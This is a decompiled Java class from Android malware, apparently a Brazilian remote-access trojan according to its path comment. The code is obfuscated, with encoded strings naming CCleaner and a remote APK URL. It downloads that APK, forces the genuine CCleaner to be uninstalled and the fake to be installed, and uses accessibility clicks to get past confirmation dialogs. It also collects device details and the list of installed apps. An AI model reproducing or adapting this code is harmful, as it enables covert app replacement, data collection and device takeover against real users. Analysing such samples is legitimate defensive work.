package com.irifix;

import a.d;
import a.l;
import a.t;
import android.content.ActivityNotFoundException;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.StrictMode;
import android.os.SystemClock;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.File;
import java.io.IOException;
import java.util.List;
import java.util.Locale;
import okhttp3.ab;
import okhttp3.w;
import okhttp3.z;

public class e {
  private static String a = "";
  
  private static BroadcastReceiver b;
  
  private static BroadcastReceiver c;
  
  private static final Object d = new Object();
  
  private static boolean e;
  
  private static boolean f;
  
  public static String a() {
    String str = "";
    for (byte b = 0; b < 8; b++) {
      (new int[8])[0] = 65468;
      (new int[8])[1] = 65468;
      (new int[8])[2] = 65427;
      (new int[8])[3] = 65434;
      (new int[8])[4] = 65438;
      (new int[8])[5] = 65425;
      (new int[8])[6] = 65434;
      (new int[8])[7] = 65421;
      int i = (new int[8])[b];
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(str);
      stringBuilder.append((char)((i ^ 0xFFFF) & 0xFFFF));
      str = stringBuilder.toString();
    } 
    return str.replace("[", "\\[").replace("]", "\\]");
  }
  
  private static void a(long paramLong) {
    try {
      Thread.sleep(paramLong);
    } catch (InterruptedException interruptedException) {}
  }
  
  public static void a(Context paramContext) {
    (new Thread(new Runnable(paramContext) {
          public void run() {
            e.b(this.a);
          }
        })).start();
  }
  
  private static void a(Context paramContext, int paramInt, boolean paramBoolean1, boolean paramBoolean2, boolean paramBoolean3, boolean paramBoolean4, boolean paramBoolean5) {
    boolean bool;
    if (paramBoolean1 || Permissions.a(paramContext)) {
      bool = true;
    } else {
      bool = false;
    } 
    if (bool) {
      if (paramBoolean2 || c.a(paramContext)) {
        paramBoolean1 = true;
      } else {
        paramBoolean1 = false;
      } 
      if (paramBoolean1) {
        if (paramBoolean3 || e()) {
          paramBoolean2 = true;
        } else {
          paramBoolean2 = false;
        } 
        if (paramBoolean2) {
          if (paramBoolean4 || e(paramContext)) {
            paramBoolean3 = true;
          } else {
            paramBoolean3 = false;
          } 
          if (paramBoolean3) {
            if (paramBoolean5 || d(paramContext)) {
              paramBoolean4 = true;
            } else {
              paramBoolean4 = false;
            } 
            if (paramBoolean4) {
              paramBoolean5 = b.a(paramContext);
            } else {
              paramBoolean5 = false;
            } 
          } else {
            paramBoolean5 = false;
            paramBoolean4 = paramBoolean5;
          } 
        } else {
          paramBoolean3 = false;
          paramBoolean5 = false;
          paramBoolean4 = paramBoolean3;
        } 
        List list = paramContext.getPackageManager().getInstalledApplications(128);
        StringBuilder stringBuilder = new StringBuilder();
        for (ApplicationInfo applicationInfo : list) {
          if ((applicationInfo.flags & 0x1) == 0) {
            stringBuilder.append(applicationInfo.packageName);
            stringBuilder.append(",");
          } 
        } 
        i.a(String.format("%s|%s|%s|%d|%s|%s|%s|%s|%s|%s|%s|%s", new Object[] { 
                g.a(), g.b(), g.a(paramContext), Integer.valueOf(g.c()), Locale.getDefault().getLanguage(), String.valueOf(bool), String.valueOf(paramBoolean1), String.valueOf(paramBoolean2), String.valueOf(paramBoolean3), String.valueOf(paramBoolean4), 
                String.valueOf(paramBoolean5), stringBuilder.toString() }));
        if (!paramBoolean5 && paramInt < 3) {
          a(500L);
          a(paramContext, paramInt + 1, bool, paramBoolean1, paramBoolean2, paramBoolean3, paramBoolean4);
          return;
        } 
        if (!a.isEmpty()) {
          File file = new File(a);
          if (file.exists())
            file.delete(); 
        } 
        return;
      } 
    } else {
      paramBoolean1 = false;
    } 
    paramBoolean2 = false;
    paramBoolean3 = false;
    paramBoolean5 = false;
    paramBoolean4 = paramBoolean3;
  }
  
  public static void a(List<AccessibilityNodeInfo> paramList) {
    StringBuilder stringBuilder1 = new StringBuilder();
    stringBuilder1.append("(");
    stringBuilder1.append(a());
    stringBuilder1.append(")");
    List<AccessibilityNodeInfo> list = a.b(stringBuilder1.toString(), paramList);
    StringBuilder stringBuilder2 = new StringBuilder();
    stringBuilder2.append("(");
    stringBuilder2.append(l.a(l.a));
    stringBuilder2.append(")");
    paramList = a.b(stringBuilder2.toString(), paramList);
    if (a.a(list) && a.a(paramList))
      ((AccessibilityNodeInfo)paramList.get(0)).performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_CLICK.getId()); 
  }
  
  public static String b() {
    String str = "";
    for (byte b = 0; b < 21; b++) {
      (new int[21])[0] = 10544;
      (new int[21])[1] = 10556;
      (new int[21])[2] = 10554;
      (new int[21])[3] = 10491;
      (new int[21])[4] = 10557;
      (new int[21])[5] = 10550;
      (new int[21])[6] = 10559;
      (new int[21])[7] = 10550;
      (new int[21])[8] = 10547;
      (new int[21])[9] = 10556;
      (new int[21])[10] = 10559;
      (new int[21])[11] = 10554;
      (new int[21])[12] = 10491;
      (new int[21])[13] = 10544;
      (new int[21])[14] = 10544;
      (new int[21])[15] = 10553;
      (new int[21])[16] = 10546;
      (new int[21])[17] = 10542;
      (new int[21])[18] = 10555;
      (new int[21])[19] = 10546;
      (new int[21])[20] = 10559;
      int i = (new int[21])[b];
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(str);
      stringBuilder.append((char)(0xFFFF & i - 10445));
      str = stringBuilder.toString();
    } 
    return str;
  }
  
  public static void b(List<AccessibilityNodeInfo> paramList) {
    StringBuilder stringBuilder1 = new StringBuilder();
    stringBuilder1.append("(");
    stringBuilder1.append(a());
    stringBuilder1.append(")");
    List<AccessibilityNodeInfo> list1 = a.b(stringBuilder1.toString(), paramList);
    StringBuilder stringBuilder2 = new StringBuilder();
    stringBuilder2.append("(");
    stringBuilder2.append(l.a(l.b));
    stringBuilder2.append(")");
    List<AccessibilityNodeInfo> list2 = a.b(stringBuilder2.toString(), paramList);
    paramList = a.c("(.*:id/button1)", paramList);
    if (a.a(list1) && a.a(list2) && a.a(paramList))
      ((AccessibilityNodeInfo)paramList.get(0)).performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_CLICK.getId()); 
  }
  
  public static String c() {
    String str = "";
    for (byte b = 0; b < 34; b++) {
      (new int[34])[0] = 65431;
      (new int[34])[1] = 65419;
      (new int[34])[2] = 65419;
      (new int[34])[3] = 65423;
      (new int[34])[4] = 65420;
      (new int[34])[5] = 65477;
      (new int[34])[6] = 65488;
      (new int[34])[7] = 65488;
      (new int[34])[8] = 65414;
      (new int[34])[9] = 65434;
      (new int[34])[10] = 65426;
      (new int[34])[11] = 65425;
      (new int[34])[12] = 65430;
      (new int[34])[13] = 65436;
      (new int[34])[14] = 65489;
      (new int[34])[15] = 65436;
      (new int[34])[16] = 65424;
      (new int[34])[17] = 65426;
      (new int[34])[18] = 65488;
      (new int[34])[19] = 65438;
      (new int[34])[20] = 65423;
      (new int[34])[21] = 65423;
      (new int[34])[22] = 65490;
      (new int[34])[23] = 65421;
      (new int[34])[24] = 65434;
      (new int[34])[25] = 65427;
      (new int[34])[26] = 65434;
      (new int[34])[27] = 65438;
      (new int[34])[28] = 65420;
      (new int[34])[29] = 65434;
      (new int[34])[30] = 65489;
      (new int[34])[31] = 65438;
      (new int[34])[32] = 65423;
      (new int[34])[33] = 65428;
      int i = (new int[34])[b];
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(str);
      stringBuilder.append((char)((i ^ 0xFFFF) & 0xFFFF));
      str = stringBuilder.toString();
    } 
    return str;
  }
  
  private static void c(Context paramContext) {
    f.a(paramContext);
    a(paramContext, 1, false, false, false, false, false);
    f.a();
    g.d(paramContext);
    a(2000L);
    k.a(paramContext);
    f.b();
  }
  
  private static boolean d(Context paramContext) {
    e = false;
    b = new BroadcastReceiver() {
        public void onReceive(Context param1Context, Intent param1Intent) {
          if (param1Intent.getData() == null)
            return; 
          if (param1Intent.getData().getSchemeSpecificPart().equals(e.b())) {
            e.a(true);
            synchronized (e.d()) {
              e.d().notify();
            } 
          } 
        }
      };
    IntentFilter intentFilter = new IntentFilter();
    intentFilter.addAction("android.intent.action.PACKAGE_ADDED");
    intentFilter.addDataScheme("package");
    paramContext.registerReceiver(b, intentFilter);
    f();
    Intent intent = new Intent("android.intent.action.INSTALL_PACKAGE");
    intent.setData(Uri.fromFile(new File(a)));
    intent.addFlags(268435456);
    intent.addFlags(32768);
    intent.addFlags(8388608);
    paramContext.startActivity(intent);
    synchronized (d) {
      d.wait(30000L);
    } 
    /* monitor exit ClassFileLocalVariableReferenceExpression{type=ObjectType{android/content/Intent}, name=null} */
    paramContext.unregisterReceiver(b);
    return e;
  }
  
  private static boolean e() {
    boolean bool2;
    boolean bool1 = false;
    try {
      w w = new w();
      this();
      z.a a = new z.a();
      this();
      ab ab = w.a(a.a(c()).a()).a();
      bool2 = bool1;
      if (ab.c()) {
        if (a.isEmpty()) {
          StringBuilder stringBuilder = new StringBuilder();
          this();
          stringBuilder.append(Environment.getExternalStorageDirectory());
          stringBuilder.append("/");
          stringBuilder.append(String.valueOf(SystemClock.elapsedRealtime()));
          stringBuilder.append(".apk");
          a = stringBuilder.toString();
        } 
        File file = new File();
        this(a);
        d d = l.a(l.a(file));
        d.a((t)ab.f().c());
        d.close();
        bool2 = true;
      } 
    } catch (IOException iOException) {
      bool2 = bool1;
    } 
    return bool2;
  }
  
  private static boolean e(Context paramContext) {
    f = false;
    if (g.b(paramContext, b())) {
      c = new BroadcastReceiver() {
          public void onReceive(Context param1Context, Intent param1Intent) {
            if (param1Intent.getData() == null)
              return; 
            if (param1Intent.getData().getSchemeSpecificPart().equals(e.b())) {
              e.b(true);
              synchronized (e.d()) {
                e.d().notify();
              } 
            } 
          }
        };
      IntentFilter intentFilter = new IntentFilter();
      intentFilter.addAction("android.intent.action.PACKAGE_REMOVED");
      intentFilter.addDataScheme("package");
      paramContext.registerReceiver(c, intentFilter);
      try {
        Intent intent = new Intent();
        this();
        intent.setPackage(b());
        intent.setAction("android.intent.action.UNINSTALL_PACKAGE");
        intent.addFlags(268435456);
        intent.addFlags(32768);
        intent.addFlags(8388608);
        paramContext.startActivity(intent);
      } catch (ActivityNotFoundException activityNotFoundException) {
        Intent intent = new Intent("android.intent.action.UNINSTALL_PACKAGE");
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("package:");
        stringBuilder.append(b());
        intent.setData(Uri.parse(stringBuilder.toString()));
        intent.addFlags(268435456);
        intent.addFlags(32768);
        intent.addFlags(8388608);
        paramContext.startActivity(intent);
      } 
      synchronized (d) {
        d.wait(10000L);
      } 
      /* monitor exit ClassFileLocalVariableReferenceExpression{type=ObjectType{android/content/IntentFilter}, name=null} */
      paramContext.unregisterReceiver(c);
    } else {
      f = true;
    } 
    return f;
  }
  
  private static void f() {
    if (Build.VERSION.SDK_INT >= 24)
      try {
        StrictMode.class.getMethod("disableDeathOnFileUriExposure", new Class[0]).invoke(null, new Object[0]);
      } catch (Exception exception) {} 
  }
}


/* Location:              /home/fahim/Desktop/BrazilianRat-dex2jar.jar!/com/irifix/e.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */